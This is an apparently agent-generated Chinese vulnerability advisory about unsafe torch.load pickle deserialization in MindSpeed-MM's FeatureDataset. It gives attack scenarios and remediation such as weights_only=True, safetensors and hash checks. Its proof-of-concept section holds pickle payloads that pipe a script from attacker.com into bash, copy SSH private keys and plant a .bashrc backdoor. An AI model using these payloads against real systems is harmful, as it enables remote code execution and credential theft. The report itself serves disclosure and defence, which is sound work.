# VULN-src_mindspeed_mm-pickle_deserialization-001：特征数据加载torch.load无保护致Pickle RCE

## 漏洞基本信息

| 属性 | 值 |
|------|------|
| **漏洞 ID** | VULN-src_mindspeed_mm-pickle_deserialization-001 |
| **类型** | Pickle Deserialization (CWE-502) |
| **严重级别** | High |
| **置信度** | 90% |
| **CVSS 评分** | 9.8 (Critical) |
| **文件位置** | `src/mindspeed_mm/mindspore/data/datasets/feature_dataset.py:10-21` |
| **函数名称** | `get_data_from_feature_data` |

## 漏洞描述

`get_data_from_feature_data` 函数接收用户可控的 `feature_path` 参数，直接传递给 `torch.load()` 进行反序列化。`torch.load` 内部使用 pickle，可导致任意代码执行。该函数通过 `apply_mindspore_patch()` 被 patch 到 `mindspeed_mm.data.datasets.feature_dataset.FeatureDataset`，影响所有使用该类的代码。

## 源代码分析

### 漏洞代码片段

```python
# feature_dataset.py:10-21
import torch

def get_data_from_feature_data(self, feature_path: str) -> dict:
    """
    Load feature data from a specified file path.
    
    Args:
        feature_path (str): The path to the feature data file.
    
    Returns:
        dict: A dictionary containing the loaded feature data.
    """
    if feature_path.endswith(".pt"):
        # ⚠️ torch.load 内部使用 pickle 反序列化
        feature_data = torch.load(feature_path, map_location=torch.device('cpu'))
        # ...
        return feature_data
    raise NotImplementedError("Unsupported file format. Only .pt files are currently supported.")
```

### 安全缺陷分析

**torch.load 的安全问题**：

1. **默认行为**: `torch.load()` 默认使用 `pickle.load()` 进行反序列化
2. **weights_only 参数缺失**: 该函数没有使用 `weights_only=True` 参数（PyTorch 2.0+ 安全加载）
3. **用户输入直接传入**: `feature_path` 来自用户可控的数据集配置

### Patch 注入机制

```python
# mindspore_adaptor.py (推测)
def apply_mindspore_patch():
    # 通过 aspm 将 get_data_from_feature_data patch 到 FeatureDataset
    aspm.register_patch(
        'mindspeed_mm.data.datasets.feature_dataset.FeatureDataset.get_data_from_feature_data',
        get_data_from_feature_data
    )
    aspm.apply_patches()
```

这意味着：
- 任何使用 `FeatureDataset` 的代码都会调用此漏洞函数
- 攻击面从 `tools/` 扩展到整个多模态数据处理流程

## 数据流追踪

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 数据流路径                                                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│ feature_path@feature_dataset.py:10                                           │
│     ↓                                                                        │
│ torch.load(feature_path)@feature_dataset.py:21                               │
│     ↓                                                                        │
│ [torch.load 内部调用 pickle.load()]                                          │
│     ↓                                                                        │
│ [SINK: pickle_deserialization] ⚠️                                            │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 跨模块调用关系

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 多模态数据加载攻击链                                                          │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  用户/训练脚本                                                                │
│       │                                                                      │
│       └──→ FeatureDataset(data_config)                                      │
│               │                                                              │
│               ├──→ data_config['feature_path'] = "/path/to/features.pt"     │
│               │       │                                                      │
│               │       └──→ 用户可控（配置文件/命令行）                         │
│               │                                                              │
│               └──→ get_data_from_feature_data(self, feature_path)           │
│                       │                                                      │
│                       └──→ torch.load(feature_path)                          │
│                               │                                              │
│                               └──→ pickle.load()                             │
│                                       │                                      │
│                                       └──→ [RCE] ⚠️                          │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 漏洞利用条件和攻击场景

### 利用条件

| 条件 | 值 | 说明 |
|------|------|------|
| **Attack Vector** | feature_path 参数 | 用户可控路径 |
| **Attack Complexity** | LOW | 构造 pickle payload 简单 |
| **Privileges Required** | NONE | 无需特殊权限 |
| **User Interaction** | NONE | 自动加载 |
| **Scope** | UNCHANGED | 执行环境 |
| **Confidentiality** | HIGH | 完全控制 |
| **Integrity** | HIGH | 完全控制 |
| **Availability** | HIGH | 系统崩溃 |

### CVSS 评分: 9.8 (Critical)

### 攻击场景

**场景 1: 训练数据投毒**

```
攻击者 → 替换特征数据集 .pt 文件 → 训练脚本加载 FeatureDataset → 
get_data_from_feature_data → torch.load → pickle 反序列化 → RCE
```

**场景 2: 数据集供应链攻击**

```
恶意数据集发布者 → 上传包含 payload 的 .pt 文件 → 用户下载并训练 → RCE
```

**场景 3: 共享存储攻击**

```
多用户环境 → 攻击者修改共享存储中的特征文件 → 其他用户训练时触发 → RCE
```

**场景 4: CI/CD 管道攻击**

```
CI 管道 → 自动化训练测试 → 加载特征数据 → RCE → 管道环境被控制 → 横向移动
```

### PoC 示例

```python
import torch
import pickle
import os
import io

class MaliciousPayload:
    def __reduce__(self):
        # 反序列化时自动执行
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

def create_malicious_feature_file(filepath):
    """创建恶意特征数据文件"""
    # torch.save 使用 pickle，可以嵌入恶意对象
    malicious_data = {
        'features': torch.randn(100, 512),
        '__exploit__': MaliciousPayload()  # 嵌入 payload
    }
    torch.save(malicious_data, filepath)

# 创建恶意文件
create_malicious_feature_file('/tmp/malicious_features.pt')

# 触发漏洞（模拟 FeatureDataset 使用）
def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        feature_data = torch.load(feature_path, map_location=torch.device('cpu'))
        return feature_data

# 加载恶意文件
get_data_from_feature_data(None, '/tmp/malicious_features.pt')  # → RCE
```

**更隐蔽的 Payload**：

```python
class StealthPayload:
    def __reduce__(self):
        # 不直接执行命令，而是修改关键文件
        code = '''
import os
# 窃取 SSH 密钥
os.system('cp ~/.ssh/id_rsa /tmp/stolen_key')
# 修改 .bashrc 注入后门
with open('~/.bashrc', 'a') as f:
    f.write('\\ncurl http://attacker.com/backdoor.sh | bash &\\n')
'''
        return (exec, (code,))
```

## 危害评估和影响范围

### 影响范围

**直接影响**：

1. `src/mindspeed_mm/mindspore/data/datasets/feature_dataset.py`
2. 所有使用 `FeatureDataset` 的多模态训练脚本

**间接影响**：

1. MindSpeed-MM 整个多模态处理流程
2. 依赖此库的上游项目
3. 使用共享数据集的团队

**攻击链可达性分析**：

```
入口点分析:
├── CLI 训练脚本: python train.py --data-config config.json
│   └── config.json 中包含 feature_path 参数
│       └── FeatureDataset 加载 → RCE
│
├── API 接口: 如果有 Web API 接受数据集路径
│   └── POST /train {"feature_path": "/malicious.pt"}
│       └── RCE
│
└── 自动化训练: 定时任务/AI 平台
    └── 自动加载预定义数据集 → 如果数据集被篡改 → RCE
```

### 与其他漏洞的关联

| 关联漏洞 | 关系 | 说明 |
|------|------|------|
| tools_load_weights-CWE502-pickle-deser-001 | 同类 | 相同的 pickle 反序列化漏洞 |
| tools_load_weights-CWE502-indirect-pickle-001 | 可能触发 | load_wrapper 可能间接调用 |

## 修复建议

### 紧急修复

**1. 使用 weights_only=True (PyTorch 2.0+)**

```python
# feature_dataset.py:10-21
def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".pt"):
        # ✅ 使用 weights_only=True 安全加载
        feature_data = torch.load(
            feature_path, 
            map_location=torch.device('cpu'),
            weights_only=True  # 只加载张量，禁止任意对象
        )
        # ...
        return feature_data
```

**注意**: `weights_only=True` 需要 PyTorch 2.0+ 版本，且只支持特定格式的权重文件。

### 短期修复

**2. 使用 safetensors 格式**

```python
# feature_dataset.py (修改)
from safetensors.torch import load_file

def get_data_from_feature_data(self, feature_path: str) -> dict:
    if feature_path.endswith(".safetensors"):
        # ✅ safetensors 是安全的序列化格式
        feature_data = load_file(feature_path)
        return feature_data
    elif feature_path.endswith(".pt"):
        # ⚠️ 弃用 .pt 格式，或添加严格验证
        raise ValueError(
            ".pt format is deprecated due to security risks. "
            "Please convert to .safetensors format."
        )
```

**3. 添加文件签名验证**

```python
import hashlib
import json

# 维护已知安全文件的哈希列表
SAFE_FILES_REGISTRY = {
    '/data/features_v1.safetensors': 'sha256:abc123...',
    '/data/features_v2.safetensors': 'sha256:def456...',
}

def verify_file_hash(filepath, expected_hash):
    """验证文件哈希"""
    sha256 = hashlib.sha256()
    with open(filepath, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sha256.update(chunk)
    actual_hash = f"sha256:{sha256.hexdigest()}"
    if actual_hash != expected_hash:
        raise SecurityError(f"File hash mismatch: {filepath}")

def get_data_from_feature_data(self, feature_path: str) -> dict:
    # 验证文件哈希
    if feature_path in SAFE_FILES_REGISTRY:
        verify_file_hash(feature_path, SAFE_FILES_REGISTRY[feature_path])
    else:
        raise SecurityError(f"Unknown feature file: {feature_path}")
    
    # 安全加载
    feature_data = torch.load(feature_path, weights_only=True)
    return feature_data
```

### 长期修复

**4. 数据格式迁移计划**

```python
# 转换脚本: convert_pt_to_safetensors.py
import torch
from safetensors.torch import save_file

def convert_feature_files(input_dir, output_dir):
    """将所有 .pt 文件转换为 .safetensors"""
    for pt_file in glob.glob(f"{input_dir}/**/*.pt", recursive=True):
        data = torch.load(pt_file, weights_only=False)  # 仅在转换时允许
        
        # 只保留张量数据
        tensors_only = {k: v for k, v in data.items() if isinstance(v, torch.Tensor)}
        
        output_path = pt_file.replace('.pt', '.safetensors')
        save_file(tensors_only, output_path)
        
        print(f"Converted: {pt_file} -> {output_path}")

# 项目文档中说明:
# - .pt 格式已弃用
# - 新项目必须使用 .safetensors
# - 旧数据集需迁移
```

**5. 添加安全审计**

```python
import logging
logger = logging.getLogger('mindspeed_mm.security')

def get_data_from_feature_data(self, feature_path: str) -> dict:
    logger.info(f"Loading feature data from: {feature_path}")
    logger.info(f"Caller: {inspect.stack()[1].function}")
    logger.info(f"User: {os.getlogin()}")
    
    # 安全检查
    # ...
```

## 参考资料

1. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
2. [PyTorch weights_only 参数文档](https://pytorch.org/docs/stable/generated/torch.load.html)
3. [SafeTensors 格式规范](https://github.com/huggingface/safetensors)
4. [HuggingFace 关于 pickle 安全的声明](https://huggingface.co/docs/hub/security-pickle)

---

**报告生成时间**: 2026-04-20  
**分析 Agent**: details-analyzer  
**严重级别**: High → **实际 CVSS: 9.8 (Critical)** ⚠️  
**修复优先级**: P1  
**关联漏洞**: tools_load_weights-CWE502-pickle-deser-001, tools_load_weights-CWE502-indirect-pickle-001